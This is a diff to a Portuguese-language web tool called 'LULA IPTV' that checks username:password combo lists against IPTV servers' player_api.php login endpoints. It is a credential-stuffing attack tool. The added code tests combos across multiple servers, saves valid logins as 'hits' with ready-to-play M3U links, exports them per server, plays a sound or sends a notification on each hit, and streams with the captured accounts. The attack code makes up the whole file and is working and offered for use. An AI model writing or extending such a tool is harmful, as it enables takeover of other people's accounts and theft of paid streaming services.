@@ -44,13 +44,14 @@
     }
 
     .splash-lula-img {
-      width: 110px;
-      height: 110px;
+      width: 130px;
+      height: 130px;
       border-radius: 50%;
       border: 3px solid #ff1a1a;
       box-shadow: 0 0 20px rgba(230, 0, 0, 0.8);
       object-fit: cover;
       margin-bottom: 12px;
+      background: #120305;
     }
 
     @keyframes pulseLogo {
@@ -184,6 +185,7 @@
       object-fit: cover;
       animation: lulaPulse 2.5s infinite ease-in-out;
       flex-shrink: 0;
+      background: #1a0507;
     }
 
     @keyframes lulaPulse {
@@ -638,7 +640,7 @@
 
 <div id="splash-screen">
   <div class="splash-logo-container">
-    <img src="https://i.postimg.cc/v8kRGZjj/file-000000000e3481f5826e3edf14c485d9.png" class="splash-lula-img" alt="Lula">
+    <img src="file_000000000e3481f5826e3edf14c485d9.png" class="splash-lula-img" alt="Lula">
     <h1 class="splash-title">LULA IPTV</h1>
     <p class="splash-subtitle">FAZ O L NOS HITS</p>
   </div>
@@ -662,7 +664,7 @@
 
   <!-- BANNER ANIMADO COM FOTO DO LULA E FRASES -->
   <div class="lula-banner-card">
-    <img src="https://i.postimg.cc/v8kRGZjj/file-000000000e3481f5826e3edf14c485d9.png" class="lula-face-anim" alt="Lula Face">
+    <img src="file_000000000e3481f5826e3edf14c485d9.png" class="lula-face-anim" alt="Lula Face">
     <div class="lula-quote-box">
       <span class="lula-quote-title">Companheiro Lula diz:</span>
       <span class="lula-quote-text" id="lulaBannerQuote">"Nunca antes na história deste país se testou tanto M3U!"</span>
@@ -702,6 +704,18 @@
           <i class="fas fa-signature"></i>
           <input type="text" id="guerreiroNick" class="input-dark nick-input" placeholder="Digite seu Nick..." style="color:#ffffff;">
         </div>
+      </div>
+
+      <!--  #11 - MÚLTIPLOS SERVIDORES -->
+      <div class="input-wrapper">
+        <span class="input-label">Servidores Adicionais (um por linha)</span>
+        <div style="display:flex; flex-direction:column; gap:6px;">
+          <textarea id="extraServersList" class="input-dark" rows="3" placeholder="http://servidor2.com:80&#10;http://servidor3.com:8080" style="background:#0f0203; border:1px solid #330a0d; border-radius:12px; padding:10px; font-family:monospace; font-size:0.75rem; resize:vertical; color:#fff;"></textarea>
+          <button id="addExtraServersBtn" class="btn-action-sub" style="padding:6px; font-size:0.68rem;">
+            <i class="fas fa-plus-circle"></i> Adicionar à Lista de Servidores
+          </button>
+        </div>
+        <div id="extraServersTags" style="display:flex; flex-wrap:wrap; gap:4px; margin-top:6px;"></div>
       </div>
     </div>
   </div>
@@ -835,10 +849,61 @@
       <button id="extractFullReportBtn" class="btn-action-sub" style="padding:10px 6px; font-size:0.68rem;">
         <i class="fas fa-file-export"></i> Relatório Completo
       </button>
+      <button id="extractByDomainBtn" class="btn-action-sub" style="padding:10px 6px; font-size:0.68rem; grid-column: span 2;">
+        <i class="fas fa-layer-group"></i> Extrair por Domínio (1 txt por servidor)
+      </button>
     </div>
     <div style="text-align:center; margin-top:10px; font-size:0.65rem; color:#a37276;">
       <i class="fas fa-info-circle"></i> Hits disponíveis: 
       <span id="lulaExtractCount" style="color:#00ff66; font-weight:900;">0</span>
+    </div>
+  </div>
+
+  <!--  #18 - ESTATÍSTICAS HISTÓRICAS -->
+  <div class="panel-card">
+    <div class="hits-header">
+      <div class="card-title" style="margin:0;"><i class="fas fa-chart-line"></i> Estatísticas Históricas</div>
+      <button id="clearStatsBtn" class="btn-action-sub" style="width:auto; padding:4px 10px; font-size:0.6rem;">
+        <i class="fas fa-trash"></i> Zerar
+      </button>
+    </div>
+    <div class="stats-dashboard" style="grid-template-columns:repeat(3,1fr);">
+      <div class="stat-box">
+        <span class="stat-num" id="histTotalScans">0</span>
+        <span class="stat-lbl">Scans</span>
+      </div>
+      <div class="stat-box hit-box">
+        <span class="stat-num" id="histTotalHits">0</span>
+        <span class="stat-lbl">Hits Totais</span>
+      </div>
+      <div class="stat-box">
+        <span class="stat-num" id="histTotalTested">0</span>
+        <span class="stat-lbl">Testados</span>
+      </div>
+    </div>
+    <div style="margin-top:10px; font-size:0.68rem; color:#a37276;">
+      <div style="margin-bottom:4px;"><b style="color:#ff4d4d;">Top Servidores (por hits):</b></div>
+      <div id="histTopServers" style="font-family:monospace; color:#e2e2e2;">—</div>
+    </div>
+  </div>
+
+  <!--  #17 - EDITOR DE TEMPLATE -->
+  <div class="panel-card">
+    <div class="card-title"><i class="fas fa-pen-fancy"></i> Editor de Template do Hit</div>
+    <div style="font-size:0.65rem; color:#a37276; margin-bottom:8px;">
+      Variáveis: <code style="color:#00ff66;">{user}</code> <code style="color:#00ff66;">{pass}</code> <code style="color:#00ff66;">{server}</code> <code style="color:#00ff66;">{status}</code> <code style="color:#00ff66;">{exp}</code> <code style="color:#00ff66;">{m3u}</code> <code style="color:#00ff66;">{nick}</code> <code style="color:#00ff66;">{frase}</code> <code style="color:#00ff66;">{canais}</code> <code style="color:#00ff66;">{filmes}</code> <code style="color:#00ff66;">{series}</code>
+    </div>
+    <textarea id="templateEditor" class="input-dark" rows="8" style="background:#0f0203; border:1px solid #330a0d; border-radius:12px; padding:10px; font-family:monospace; font-size:0.68rem; color:#00ff66; resize:vertical; width:100%;"></textarea>
+    <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:6px; margin-top:8px;">
+      <button id="saveTemplateBtn" class="btn-action-sub" style="padding:8px 4px; font-size:0.65rem;">
+        <i class="fas fa-save"></i> Salvar
+      </button>
+      <button id="resetTemplateBtn" class="btn-action-sub" style="padding:8px 4px; font-size:0.65rem;">
+        <i class="fas fa-undo"></i> Padrão
+      </button>
+      <button id="previewTemplateBtn" class="btn-action-sub" style="padding:8px 4px; font-size:0.65rem;">
+        <i class="fas fa-eye"></i> Preview
+      </button>
     </div>
   </div>
 
@@ -1177,6 +1242,10 @@
   let isRunning = false;
   let hitsArray = [];
   let hitsData = [];   //  array paralelo estruturado para extrações
+  let extraServers = [];  //  #11 - servidores adicionais
+  let customTemplate = null;  //  #17 - template customizado
+  let currentAudioCtx = null;  //  #6 - som
+  let statsHistory = { scans: 0, hits: 0, tested: 0, serverHits: {} };  //  #18
   let totalTasks = 0;
   let processedTasks = 0;
   let countHits = 0;
@@ -1212,9 +1281,28 @@
                   parseInt(document.getElementById('botCountInput').value) || 20 : 
                   parseInt(document.getElementById('botComboInput').value) || 5;
 
-    totalTasks = totalLines.length;
+    const nickGuerreiro = document.getElementById('guerreiroNick').value.trim() || "LULA PRO";
+    
+    //  #11 - Monta fila multiplicando combos × servidores (principal + extras)
+    let allServers = [currentTypedServer.replace(/\/+$/, '')];
+    extraServers.forEach(s => {
+      const clean = s.replace(/\/+$/, '');
+      if (!allServers.includes(clean)) allServers.push(clean);
+    });
+
+    let queue = [];
+    totalLines.forEach(item => {
+      allServers.forEach(srv => {
+        queue.push({ line: item.line, comboName: item.comboName, server: srv });
+      });
+    });
+
+    totalTasks = queue.length;
     processedTasks = 0;
     statTotal.innerText = `0/${totalTasks}`;
+    statsHistory.scans++;
+    saveStats();
+    renderStats();
 
     let start = Date.now();
     timerInterval = setInterval(() => {
@@ -1226,17 +1314,13 @@
       else clearInterval(cpmInt);
     }, 1000);
 
-    const nickGuerreiro = document.getElementById('guerreiroNick').value.trim() || "LULA PRO";
-    
-    let queue = [...totalLines];
-
     const worker = async () => {
       while (queue.length > 0 && isRunning) {
         const item = queue.shift();
         const [user, pass] = item.line.split(':');
         if (!user || !pass) continue;
 
-        const cleanServer = currentTypedServer.replace(/\/$/, '');
+        const cleanServer = (item.server || currentTypedServer).replace(/\/$/, '');
         const endpoint = `${cleanServer}/player_api.php?username=${encodeURIComponent(user.trim())}&password=${encodeURIComponent(pass.trim())}`;
 
         try {
@@ -1254,7 +1338,7 @@
               max: info.max_connections ? parseInt(info.max_connections) : 1,
               created: info.created_at || null,
               expiration: info.exp_date || null,
-              server: currentTypedServer,
+              server: cleanServer,
               timezone: info.timezone || 'America/Sao_Paulo',
               m3u: `${cleanServer}/get.php?username=${user.trim()}&password=${pass.trim()}&type=m3u_plus`,
               comboName: item.comboName,
@@ -1270,6 +1354,18 @@
               finalTemplate = buildLulaTemplate(dataObj, nickGuerreiro);
             } else {
               finalTemplate = buildLulaTemplateNoCategories(dataObj, nickGuerreiro);
+            }
+
+            //  #17 - Usa template customizado se existir
+            if (customTemplate) {
+              finalTemplate = applyCustomTemplate(customTemplate, {
+                user: user.trim(), pass: pass.trim(),
+                server: cleanServer, status: info.status || 'Active',
+                exp: dataObj.expiration ? new Date(dataObj.expiration * 1000).toLocaleDateString('pt-BR') : '---',
+                m3u: dataObj.m3u, nick: nickGuerreiro,
+                frase: getRandomLulaPhrase(),
+                canais: dataObj.liveCount, filmes: dataObj.movieCount, series: dataObj.seriesCount
+              });
             }
 
             hitsArray.push(finalTemplate);
@@ -1297,6 +1393,13 @@
             statHits.innerText = countHits;
             hitBadgeCount.innerText = countHits;
 
+            //  #6 - SOM
+            playHitSound();
+            //  #14 - NOTIFICAÇÃO + VIBRAÇÃO
+            notifyHit(user.trim(), cleanServer);
+            //  #18 - ESTATÍSTICA
+            incrementStats(cleanServer);
+
             renderUIHit(user.trim(), finalTemplate);
           }
         } catch (err) {
@@ -1319,6 +1422,10 @@
     clearInterval(timerInterval);
     btnIcon.className = "fas fa-play";
     engineActionBtn.className = "fab-engine-control idle-state";
+    //  #18 - soma testados no histórico
+    statsHistory.tested += processedTasks;
+    saveStats();
+    renderStats();
   }
 
   function renderUIHit(user, template) {
@@ -1329,8 +1436,9 @@
         <span class="hit-username">${user}</span>
         <div class="hit-sub-server">${currentTypedServer}</div>
       </div>
-      <div style="display:flex; align-items:center; gap:10px;">
-        <span style="font-size:0.72rem; color:#a37276; font-family:monospace;"></span>
+      <div style="display:flex; align-items:center; gap:6px;">
+        <button class="hit-play-btn" title="Testar Player" style="background:transparent;border:1px solid #ff3333;border-radius:6px;color:#ff3333;padding:3px 7px;font-size:0.7rem;cursor:pointer;"><i class="fas fa-play"></i></button>
+        <button class="hit-share-btn" title="Notificar/Compartilhar" style="background:transparent;border:1px solid #ff3333;border-radius:6px;color:#ff3333;padding:3px 7px;font-size:0.7rem;cursor:pointer;"><i class="fas fa-bell"></i></button>
         <div class="status-dot"></div>
       </div>
     `;
@@ -1339,8 +1447,22 @@
     box.className = 'hit-template-details';
     box.textContent = template;
 
-    row.addEventListener('click', () => {
+    row.addEventListener('click', (e) => {
+      if (e.target.closest('.hit-play-btn') || e.target.closest('.hit-share-btn')) return;
       box.style.display = box.style.display === 'block' ? 'none' : 'block';
+    });
+
+    //  #10 - PLAYER: abre player com o hit mais recente
+    row.querySelector('.hit-play-btn').addEventListener('click', (e) => {
+      e.stopPropagation();
+      const last = hitsData[hitsData.length - 1];
+      if (last) openInternalPlayer(last.server, last.user, last.pass);
+    });
+
+    //  #14 - NOTIFICAÇÃO do hit específico
+    row.querySelector('.hit-share-btn').addEventListener('click', (e) => {
+      e.stopPropagation();
+      notifyHit(user, currentTypedServer);
     });
 
     hitsCollectionLog.insertBefore(box, hitsCollectionLog.firstChild);
@@ -1499,6 +1621,299 @@
   window.extractServersLula = extractServersLula;
   window.extractFullReportLula = extractFullReportLula;
   window.getLulaHitsData = () => hitsData;
+
+  // =============================================
+  //  #6 - SOM DE HIT
+  // =============================================
+  function playHitSound() {
+    try {
+      if (!currentAudioCtx) currentAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const ctx = currentAudioCtx;
+      // "Plim" duplo estilo vitória
+      [880, 1320].forEach((freq, i) => {
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.type = 'sine';
+        osc.frequency.value = freq;
+        const t = ctx.currentTime + i * 0.12;
+        gain.gain.setValueAtTime(0.001, t);
+        gain.gain.exponentialRampToValueAtTime(0.25, t + 0.02);
+        gain.gain.exponentialRampToValueAtTime(0.001, t + 0.25);
+        osc.start(t);
+        osc.stop(t + 0.3);
+      });
+    } catch(e) { /* silencioso */ }
+  }
+
+  // =============================================
+  //  #10 - PLAYER M3U INTERNO
+  // =============================================
+  function openInternalPlayer(server, user, pass) {
+    const m3uUrl = `${server.replace(/\/+$/, '')}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+    const overlay = document.createElement('div');
+    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.96);z-index:99999;display:flex;flex-direction:column;padding:16px;';
+    overlay.innerHTML = `
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+        <span style="color:#ff3333; font-weight:bold; font-size:0.85rem;"><i class="fas fa-play-circle"></i> Player Lula IPTV</span>
+        <button id="closePlayerOverlay" style="background:transparent;border:1px solid #ff3333;color:#ff3333;padding:6px 12px;border-radius:6px;font-weight:bold;"> Fechar</button>
+      </div>
+      <div style="color:#00ff66; font-family:monospace; font-size:0.7rem; margin-bottom:8px; word-break:break-all;">
+        ${user}:${pass} @ ${server}
+      </div>
+      <div style="font-size:0.68rem; color:#a37276; margin-bottom:10px; line-height:1.5;">
+        Cole o link abaixo no VLC ou use o teste rápido:<br>
+        <input type="text" value="${m3uUrl}" style="width:100%; background:#0f0203; border:1px solid #330a0d; color:#00ff66; padding:8px; border-radius:6px; font-family:monospace; font-size:0.65rem; margin-top:6px;" readonly>
+      </div>
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-bottom:10px;">
+        <button id="copyM3UFromPlayer" style="background:linear-gradient(180deg,#330a0d,#1f0406); color:#d1b8ba; border:1px solid #4a1116; padding:8px; border-radius:8px; font-weight:bold; font-size:0.7rem;"> Copiar M3U</button>
+        <button id="testStreamFromPlayer" style="background:linear-gradient(180deg,#0a3315,#041f0c); color:#00ff66; border:1px solid #14522a; padding:8px; border-radius:8px; font-weight:bold; font-size:0.7rem;"> Testar Stream</button>
+      </div>
+      <div id="streamTestArea" style="flex:1; display:flex; align-items:center; justify-content:center; color:#a37276; font-size:0.75rem; border:1px dashed #330a0d; border-radius:12px; overflow:hidden; position:relative;">
+        Clique em "Testar Stream" para tentar reproduzir
+      </div>
+    `;
+    document.body.appendChild(overlay);
+
+    overlay.querySelector('#closePlayerOverlay').onclick = () => overlay.remove();
+
+    overlay.querySelector('#copyM3UFromPlayer').onclick = () => {
+      navigator.clipboard?.writeText(m3uUrl).then(() => {
+        alert(' M3U copiado!');
+      }).catch(() => {});
+    };
+
+    overlay.querySelector('#testStreamFromPlayer').onclick = () => {
+      const area = overlay.querySelector('#streamTestArea');
+      area.innerHTML = `<video id="lulaPlayerVideo" controls autoplay playsinline style="width:100%; height:100%; background:#000;"></video>
+        <div style="position:absolute; top:10px; left:20px; right:20px; color:#a37276; font-size:0.65rem; text-align:center;">
+          Tentando carregar stream... Se ficar preto, o codec pode não ser suportado pelo navegador.
+        </div>`;
+      const video = overlay.querySelector('#lulaPlayerVideo');
+      video.src = `${server.replace(/\/+$/, '')}/live/${encodeURIComponent(user)}/${encodeURIComponent(pass)}/1.m3u8`;
+      video.onerror = () => {
+        const errDiv = document.createElement('div');
+        errDiv.style.cssText = 'color:#ff3333; font-size:0.7rem; text-align:center; padding:20px;';
+        errDiv.textContent = ' Não foi possível reproduzir. Use o link M3U no VLC.';
+        area.innerHTML = '';
+        area.appendChild(errDiv);
+      };
+    };
+  }
+
+  // =============================================
+  //  #11 - MÚLTIPLOS SERVIDORES
+  // =============================================
+  const extraServersInput = document.getElementById('extraServersList');
+  const addExtraServersBtn = document.getElementById('addExtraServersBtn');
+  const extraServersTags = document.getElementById('extraServersTags');
+
+  function renderExtraServers() {
+    if (!extraServersTags) return;
+    extraServersTags.innerHTML = '';
+    extraServers.forEach((srv, i) => {
+      const tag = document.createElement('div');
+      tag.style.cssText = 'background:#0f0203; border:1px solid #4a1116; border-radius:6px; padding:4px 8px; font-size:0.65rem; color:#ff4d4d; font-family:monospace; display:flex; align-items:center; gap:6px;';
+      tag.innerHTML = `${srv} <span style="cursor:pointer; color:#ff6b6b; font-weight:bold;" data-idx="${i}"></span>`;
+      tag.querySelector('span').onclick = () => {
+        extraServers.splice(i, 1);
+        renderExtraServers();
+      };
+      extraServersTags.appendChild(tag);
+    });
+  }
+
+  addExtraServersBtn?.addEventListener('click', () => {
+    const lines = extraServersInput.value.split('\n')
+      .map(l => l.trim())
+      .filter(l => l.startsWith('http'));
+    lines.forEach(l => {
+      const clean = l.replace(/\/+$/, '');
+      if (!extraServers.includes(clean)) extraServers.push(clean);
+    });
+    extraServersInput.value = '';
+    renderExtraServers();
+  });
+
+  // =============================================
+  //  #14 - NOTIFICAÇÃO DE HIT
+  // =============================================
+  async function notifyHit(user, server) {
+    // Vibração mobile
+    if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+    // Notificação do sistema (se permitido)
+    if ('Notification' in window) {
+      if (Notification.permission === 'default') {
+        try { await Notification.requestPermission(); } catch(e) {}
+      }
+      if (Notification.permission === 'granted') {
+        try {
+          new Notification(' LULA IPTV - HIT!', {
+            body: `${user} @ ${server}`,
+            icon: 'file_000000000e3481f5826e3edf14c485d9.png',
+            tag: 'lula-hit'
+          });
+        } catch(e) {}
+      }
+    }
+  }
+
+  // =============================================
+  //  #15 - EXTRAÇÃO POR DOMÍNIO
+  // =============================================
+  function extractByDomainLula() {
+    if (hitsData.length === 0) {
+      alert(' Nenhum hit para extrair! Rode o scan primeiro.');
+      return;
+    }
+    // Agrupa por servidor
+    const byServer = {};
+    hitsData.forEach(h => {
+      if (!byServer[h.server]) byServer[h.server] = [];
+      byServer[h.server].push(h);
+    });
+    // Gera 1 arquivo por servidor
+    Object.keys(byServer).forEach(srv => {
+      const hits = byServer[srv];
+      const content = hits.map(h => h.m3u).join('\n');
+      const safeName = srv.replace(/^https?:\/\//, '').replace(/[^\w.-]/g, '_');
+      const filename = `hits_${safeName}_${lulaTimestamp()}.txt`;
+      lulaDownloadFile(filename, content);
+    });
+    console.log(` ${Object.keys(byServer).length} arquivos gerados (1 por servidor)`);
+  }
+  window.extractByDomainLula = extractByDomainLula;
+
+  // =============================================
+  //  #17 - EDITOR DE TEMPLATE
+  // =============================================
+  const DEFAULT_TEMPLATE = `   HIT DO LULA  
+   : {user}
+   : {pass}
+   : {status}
+  x : {exp}
+   : {server}
+   : LULA M3U SCANNER
+    : {nick}
+   : {frase}
+  Faz o L nos Hits!
+
+ 3 : {m3u}
+
+ Canais: {canais} |  Filmes: {filmes} |  Séries: {series}`;
+
+  const templateEditor = document.getElementById('templateEditor');
+  if (templateEditor) {
+    try {
+      const saved = localStorage.getItem('lulaCustomTemplate');
+      templateEditor.value = saved || DEFAULT_TEMPLATE;
+      customTemplate = saved || null;
+    } catch(e) {
+      templateEditor.value = DEFAULT_TEMPLATE;
+    }
+  }
+
+  document.getElementById('saveTemplateBtn')?.addEventListener('click', () => {
+    customTemplate = templateEditor.value;
+    try { localStorage.setItem('lulaCustomTemplate', customTemplate); } catch(e) {}
+    alert(' Template salvo! Próximos hits usarão esse formato.');
+  });
+
+  document.getElementById('resetTemplateBtn')?.addEventListener('click', () => {
+    templateEditor.value = DEFAULT_TEMPLATE;
+    customTemplate = null;
+    try { localStorage.removeItem('lulaCustomTemplate'); } catch(e) {}
+    alert(' Template restaurado ao padrão.');
+  });
+
+  document.getElementById('previewTemplateBtn')?.addEventListener('click', () => {
+    const preview = applyCustomTemplate(templateEditor.value, {
+      user: 'lula2026', pass: 'picanha123', server: 'http://exemplo.com:8080',
+      status: 'Active', exp: new Date(Date.now() + 86400000 * 30).toLocaleDateString('pt-BR'),
+      m3u: 'http://exemplo.com:8080/get.php?username=lula2026&password=picanha123&type=m3u_plus',
+      nick: 'LULA PRO', frase: getRandomLulaPhrase(),
+      canais: 1200, filmes: 4500, series: 800
+    });
+    alert(' Preview:\n\n' + preview);
+  });
+
+  function applyCustomTemplate(tpl, data) {
+    return tpl
+      .replace(/{user}/g, data.user)
+      .replace(/{pass}/g, data.pass)
+      .replace(/{server}/g, data.server)
+      .replace(/{status}/g, data.status)
+      .replace(/{exp}/g, data.exp)
+      .replace(/{m3u}/g, data.m3u)
+      .replace(/{nick}/g, data.nick)
+      .replace(/{frase}/g, data.frase)
+      .replace(/{canais}/g, data.canais)
+      .replace(/{filmes}/g, data.filmes)
+      .replace(/{series}/g, data.series);
+  }
+
+  // =============================================
+  //  #18 - ESTATÍSTICAS HISTÓRICAS
+  // =============================================
+  function loadStats() {
+    try {
+      const saved = localStorage.getItem('lulaStatsHistory');
+      if (saved) {
+        const p = JSON.parse(saved);
+        statsHistory = {
+          scans: p.scans || 0,
+          hits: p.hits || 0,
+          tested: p.tested || 0,
+          serverHits: p.serverHits || {}
+        };
+      }
+    } catch(e) {}
+    renderStats();
+  }
+
+  function saveStats() {
+    try { localStorage.setItem('lulaStatsHistory', JSON.stringify(statsHistory)); } catch(e) {}
+  }
+
+  function renderStats() {
+    const el = (id) => document.getElementById(id);
+    if (el('histTotalScans')) el('histTotalScans').textContent = statsHistory.scans;
+    if (el('histTotalHits')) el('histTotalHits').textContent = statsHistory.hits;
+    if (el('histTotalTested')) el('histTotalTested').textContent = statsHistory.tested;
+
+    const topEl = el('histTopServers');
+    if (topEl) {
+      const entries = Object.entries(statsHistory.serverHits)
+        .sort((a, b) => b[1] - a[1])
+        .slice(0, 5);
+      if (entries.length === 0) topEl.textContent = '—';
+      else topEl.innerHTML = entries.map(([srv, cnt], i) => 
+        `${i+1}. ${srv.replace(/^https?:\/\//, '')} <span style="color:#00ff66;">(${cnt})</span>`
+      ).join('<br>');
+    }
+  }
+
+  document.getElementById('clearStatsBtn')?.addEventListener('click', () => {
+    if (!confirm('Zerar todas as estatísticas históricas?')) return;
+    statsHistory = { scans: 0, hits: 0, tested: 0, serverHits: {} };
+    saveStats();
+    renderStats();
+  });
+
+  function incrementStats(hitServer) {
+    statsHistory.hits++;
+    statsHistory.serverHits[hitServer] = (statsHistory.serverHits[hitServer] || 0) + 1;
+    saveStats();
+    renderStats();
+  }
+
+  // Bind do botão de extração por domínio
+  document.getElementById('extractByDomainBtn')?.addEventListener('click', extractByDomainLula);
+
+  // Carrega stats ao abrir
+  loadStats();
+  renderExtraServers();
 </script>
 </body>
 </html>
